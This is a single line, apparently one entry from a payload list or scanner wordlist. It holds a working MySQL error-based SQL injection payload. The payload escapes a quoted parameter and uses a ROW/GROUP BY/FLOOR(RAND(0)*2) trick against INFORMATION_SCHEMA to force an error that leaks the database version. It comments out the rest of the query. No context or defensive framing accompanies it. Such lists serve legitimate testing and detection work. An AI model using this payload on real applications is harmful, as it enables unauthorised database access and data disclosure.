      "1' AND ROW(1,2) > (SELECT COUNT(*),CONCAT(0x3a,0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a-- -"
